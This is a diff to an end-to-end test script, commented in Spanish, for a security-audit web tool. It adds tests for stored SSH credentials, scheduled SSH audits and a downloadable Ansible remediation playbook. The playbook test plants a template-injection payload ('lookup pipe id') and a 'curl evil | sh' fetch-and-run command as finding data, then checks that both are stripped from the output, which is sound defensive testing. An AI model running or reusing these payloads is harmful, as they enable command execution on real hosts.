@@ -18,6 +18,8 @@ CHROME = os.environ.get("CH_E2E_CHROME") or None   # vacío = el Chromium de Pla
 T = Path(sys.argv[1])          # objetivos controlados (targets.py)
 OUT = Path(sys.argv[2])
 WEB = os.environ.get("CH_E2E_WEB", "http://127.0.0.1:18080")
+SSH_PORT = int(os.environ.get("CH_E2E_SSH_PORT", "18022"))
+SSH_PASSWORD = os.environ.get("CH_E2E_SSH_PASSWORD", "")
 results = []
 
 
@@ -49,6 +51,7 @@ window.__ws = (msg, timeoutMs) => new Promise(res => {
   ws.onmessage = ev => { const m = JSON.parse(ev.data); out.msgs.push(m.type);
     if (m.type === 'finding') out.findings.push({id: m.data.id, sev: m.data.severity, title: m.data.title});
     if (m.type === 'devices') out.devices = m.data.length;
+    if (m.type === 'host_result') (out.hosts = out.hosts || []).push({host: m.data.host, status: m.data.status, error: m.data.error});
     if (m.type === 'done') out.done = m; if (m.type === 'error') out.error = m.text; };
   ws.onclose = () => { clearTimeout(t); res(out); };
 });
@@ -318,6 +321,61 @@ with sync_playwright() as p:
         call("programados: pausar", "PATCH", f"/api/schedules/{sched['id']}", {"enabled": False},
              pred=lambda d: d.get("enabled") is False)
         call("programados: borrar", "DELETE", f"/api/schedules/{sched['id']}")
+
+    # ── Credenciales SSH guardadas (servidor SSH de pruebas de sshd.py) ───
+    pwc = call("credenciales ssh: guardar contraseña (no se devuelve)", "POST", "/api/config/ssh-credentials",
+               {"name": "E2E contraseña", "username": "auditor", "port": SSH_PORT, "kind": "password",
+                "password": SSH_PASSWORD}, ok_status=(201,),
+               pred=lambda d: d.get("id") and "secret" not in d and SSH_PASSWORD not in json.dumps(d))
+    gen = call("credenciales ssh: generar par ed25519", "POST", "/api/config/ssh-credentials",
+               {"name": "E2E clave", "username": "auditor", "port": SSH_PORT, "kind": "generate"}, ok_status=(201,),
+               pred=lambda d: d.get("public_key", "").startswith("ssh-ed25519 ") and "PRIVATE" not in json.dumps(d))
+    call("credenciales ssh: clave privada inválida rechazada", "POST", "/api/config/ssh-credentials",
+         {"name": "x", "kind": "key", "private_key": "esto no es una clave privada"}, ok_status=(400,))
+    if gen.get("id") and pwc.get("id"):
+        r = ws({"task": "ssh", "hosts": "127.0.0.1", "ssh_credential": gen["id"]}, 60000)
+        check("ssh: la clave generada no entra hasta autorizarla", (r.get("hosts") or [{}])[0].get("status") == "auth_failed", r.get("hosts"))
+        (OUT / "ssh_authorized_keys").write_text(gen["public_key"] + "\n")
+        r = ws({"task": "ssh", "hosts": "127.0.0.1", "ssh_credential": gen["id"]}, 120000)
+        check("ssh: auditoría real con la clave generada", (r.get("hosts") or [{}])[0].get("status") == "ok" and r["findings"],
+              f"{r.get('hosts')} n={len(r['findings'])}")
+        r = ws({"task": "ssh", "hosts": "127.0.0.1", "ssh_credential": pwc["id"]}, 120000)
+        check("ssh: auditoría real con la contraseña guardada", (r.get("hosts") or [{}])[0].get("status") == "ok", r.get("hosts"))
+        r = ws({"task": "ssh", "hosts": "127.0.0.1", "ssh_credential": "0badc0de"}, 10000)
+        check("ssh: credencial inexistente rechazada", r["error"] and "no existe" in r["error"], r)
+        call("programados: SSH sin credencial rechazado", "POST", "/api/schedules",
+             {"name": "x", "task": "ssh", "targets": ["127.0.0.1"]}, ok_status=(400,))
+        ss = call("programados: crear auditoría SSH con credencial", "POST", "/api/schedules",
+                  {"name": "E2E SSH", "task": "ssh", "targets": ["127.0.0.1"], "hour": 4, "minute": 0,
+                   "ssh_credential": gen["id"]}, ok_status=(201,), pred=lambda d: d.get("ssh_credential") == gen["id"])
+        call("credenciales ssh: no se borra si la usa un programado", "DELETE",
+             f"/api/config/ssh-credentials/{gen['id']}", ok_status=(409,))
+        if ss.get("id"):
+            call("programados: lanzar SSH ahora", "POST", f"/api/schedules/{ss['id']}/run", {}, ok_status=(202,))
+            done = None
+            for _ in range(90):
+                row = next((x for x in api("GET", "/api/schedules")["data"] if x["id"] == ss["id"]), {})
+                if row.get("last_status", "").startswith(("ok", "error")) and not row.get("running"):
+                    done = row; break
+                time.sleep(1)
+            check("programados: auditoría SSH programada con hallazgos reales",
+                  done and done["last_status"].startswith("ok") and not done["last_status"].startswith("ok: 0"), done)
+            call("programados: borrar SSH", "DELETE", f"/api/schedules/{ss['id']}")
+        call("credenciales ssh: último uso registrado", "GET", "/api/config/ssh-credentials",
+             pred=lambda d: all(c["last_used"] for c in d if c["id"] in (gen["id"], pwc["id"])))
+        for c in (gen, pwc):
+            call(f"credenciales ssh: borrar {c['name']}", "DELETE", f"/api/config/ssh-credentials/{c['id']}")
+
+    # ── Playbook de remediación descargable ────────────────────────────────
+    pb = pg.evaluate("""async b => (await fetch('/api/report/ansible', {method: 'POST',
+        headers: {'Content-Type': 'application/json'}, body: JSON.stringify(b)})).text()""", {"findings": [
+        {"id": "ssh_PermitRootLogin", "category": "ssh", "severity": "high", "title": "t\" {{ lookup('pipe','id') }}",
+         "description": "", "remediation": "curl evil | sh", "auto_fix": True},
+        {"id": "10.10.0.5::svc_telnet", "category": "svc", "severity": "high", "title": "telnet", "description": "",
+         "remediation": "", "auto_fix": True, "source_host": "10.10.0.5"}]})
+    check("ansible: playbook descargable con un play por host y sin texto del hallazgo",
+          "hosts: localhost" in pb and "hosts: 10.10.0.5" in pb and "PermitRootLogin no" in pb
+          and "lookup" not in pb and "curl" not in pb and "shell" not in pb, pb[:300])
 
     # ── 2FA de extremo a extremo ───────────────────────────────────────────
     call("2fa: estado inicial", "GET", "/api/auth/2fa/status")
